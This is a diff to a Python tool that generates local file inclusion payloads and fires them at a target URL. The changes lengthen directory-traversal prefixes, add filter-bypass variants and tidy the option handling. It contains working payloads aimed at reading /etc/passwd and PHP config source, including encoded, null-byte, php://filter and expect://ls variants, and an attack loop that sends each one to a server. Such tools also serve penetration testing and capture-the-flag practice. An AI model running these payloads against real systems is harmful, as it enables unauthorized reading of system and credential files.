@@ -1,21 +1,4 @@
-# options to make
-# 1. absolute path                                                                                              DONE
-# dir traversal with ../../../                                                                                  DONE     
-# dir traversal but starts with /../../../ to go arount filename prefixes                                       DONE 
-# use alternative traversals for nonrecursive ../ detection:
-#   ....//, ..././, ....\/, ....////                                                                            DONE
-# use double //: ..//..//..//                                                                                   DONE
-# use urlencoding: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                                                      DONE
-# use double urlencoding: %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd                           DONE
-# -- use base64 encoding: Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==                                                      DONE 
-# -- use double base64 encoding: TGk0dkxpNHZMaTR2TGk0dlpYUmpMM0JoYzNOM1pBPT0=                                   DONE 
-# start the string off with valid path: ./languages/../../../../etc/passwd                                      HOW????????
-# start the string off with invalid path: a/../../../etc/passwd                                                 DONE 
-# -- OLD php string truncation: ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
-# nullbytes with /etc/passwd%00                                                                                 DONE
-# read source code php://filter/read=convert.base64-encode/resource=config                                      NEED TO TRY LOTTA FILENAMES
-# try \ instead of /                                                                                            DONE
-# php filters                                                                                                   FAT
+# to improve could add support for input and data PHP filters
 
 # used https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
 # and https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
@@ -46,29 +29,29 @@ def urlencodeAll(string):
 def prefixPath(pl):
     payloads = []
     for x in pl:
-        payloads.append("../../../../../../" + x);
+        payloads.append("../../../../../../../../../../../../" + x);
     return payloads
         
 def prefixPathSlash(pl):
     payloads = []
     for x in pl:
-        payloads.append("/../../../../../../" + x);
+        payloads.append("/" + x);
     return payloads
 
 def prefixPathNR(pl, multiple=False):
     payloads = []
     for x in pl:
-        payloads.append("....////....////....////....////....////....////" + x);
+        payloads.append("....////....////....////....////....////....////....////....////....////....////....////....////" + x);
         if multiple:
-            payloads.append("....//....//....//....//....//....//" + x);
-            payloads.append("..././..././..././..././..././..././" + x);
-            payloads.append("....\\/....\\/....\\/....\\/....\\/....\\/" + x);
+            payloads.append("....//....//....//....//....//....//....//....//....//....//....//....//" + x);
+            payloads.append("..././..././..././..././..././..././..././..././..././..././..././..././" + x);
+            payloads.append("....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/" + x);
     return payloads
 
 def prefixDouble(pl):
     payloads = []
     for x in pl:
-        payloads.append("..//..//..//..//..//..//" + x);
+        payloads.append("..//..//..//..//..//..//..//..//..//..//..//..//" + x);
     return payloads
 
 def forceBackslash(pl):
@@ -166,27 +149,27 @@ fullOptions = {
 }
 
 def generate(files, options):
-    base = files if options["base"] else []
-    base += prefixPath(files) if options["pref"] else []
-    base += prefixPathSlash(files) if options["prefS"] else []
-    base += prefixPathNR(files, options.get("prefNRM",0)) if options["prefNR"] else []
-    base += prefixDouble(files) if options["prefD"] else []
+    base = files.copy() if options.get("base") else []
+    base += prefixPath(files) if options.get("pref") else []
+    base += prefixPathNR(files, options.get("prefNRM")) if options.get("prefNR") else []
+    base += prefixDouble(files) if options.get("prefD") else []
 
-    forward = base
-    forward += prefixInvalidPath(forward) if options["prefInv"] else []
-    forward += forceBackslash(forward) if options["back"]  else []
-    forward += filterB64(files) if options["phpfilter64"] else [] # just takes the base files, doesnt need dir traversal, do want to append %00 though.
-    forward += ["expect://ls"] if options["phpexpect"] else []
-    forward += ["php://stdin", "php://stdout", "php://stderr"] if options["phpstreams"] else []
+    forward = base.copy()
+    forward += prefixPathSlash(forward) if options.get("prefS") else []
+    forward += prefixInvalidPath(forward) if options.get("prefInv") else []
+    forward += forceBackslash(forward) if options.get("back")  else []
+    forward += filterB64(files) if options.get("phpfilter64") else [] # just takes the base files, doesnt need dir traversal, do want to append %00 though.
+    forward += ["expect://ls"] if options.get("phpexpect") else []
+    forward += ["php://stdin", "php://stdout", "php://stderr"] if options.get("phpstreams") else []
     
-    output = forward
-    output += suffixNullbytes(forward) if options["nullbytes"] else []
-    output += append4096(forward) if options["phpstring"] else []
+    output = forward.copy()
+    output += suffixNullbytes(forward) if options.get("nullbytes") else []
+    output += append4096(forward) if options.get("phpstring") else []
     
-    output += urlencodePay(forward) if options["urlencode"] else []
-    output += doubleUrlencodePay(forward) if options["urlencodeD"] else []
-    output += base64Pay(forward) if options["base64"] else []
-    output += doubleBase64Pay(forward) if options["base64D"] else []
+    output += urlencodePay(forward) if options.get("urlencode") else []
+    output += doubleUrlencodePay(forward) if options.get("urlencodeD") else []
+    output += base64Pay(forward) if options.get("base64") else []
+    output += doubleBase64Pay(forward) if options.get("base64D") else []
 
     pathlib.Path("./out").mkdir(parents=True, exist_ok=True)
     outFile = open("./out/payload.txt", "w+")
@@ -269,6 +252,8 @@ def attack(url, payload, writeToFile = True, printFail = False):
     responseType = checkResponseType(url)
     print(f'{bcolors.OKBLUE}Attacking the server..{bcolors.ENDC}')
     print(f"{bcolors.BOLD}[0/{len(payload) - 1}]{bcolors.ENDC}")
+    
+    pathlib.Path("./out").mkdir(parents=True, exist_ok=True)
     resultsFile = open("out/attackResults.txt", "w+") if writeToFile else None
     for i in range(len(payload)):
         r = requests.get(url + payload[i])
@@ -314,6 +299,9 @@ def main():
         else:
             baseFiles = [testerForOS[commandOptions.os]]
         
+        if "" in baseFiles:
+            baseFiles.remove("")
+        
         options = defaultOptions
         if commandOptions.full == True:
             options = fullOptions
@@ -324,6 +312,10 @@ def main():
     
     if commandOptions.dontAttack == True:
         print("Saved payload. Not attacking.")
+        exit()
+    
+    if commandOptions.url == None:
+        print("No URL specified. -h or --help for the manual.")
         exit()
         
     attack(commandOptions.url, payload)
